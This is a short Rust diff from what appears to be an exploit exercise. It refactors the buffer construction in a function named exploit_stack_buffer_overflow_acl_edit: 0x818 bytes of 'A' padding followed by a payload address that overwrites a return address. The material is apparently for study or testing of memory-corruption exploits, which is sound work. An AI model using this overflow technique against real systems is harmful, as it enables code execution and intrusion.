@@ -33,8 +33,7 @@ fn exploit_stack_buffer_overflow_acl_edit() {
 
     let ret_overwrite_offset = 0x818;
 
-    let user_buffer: Vec<u8> = iter::repeat(0x41u8)
-        .take(ret_overwrite_offset)
+    let user_buffer: Vec<u8> = iter::repeat_n(0x41u8, ret_overwrite_offset)
         .chain(payload_address.to_le_bytes().iter().cloned())
         .collect();
 
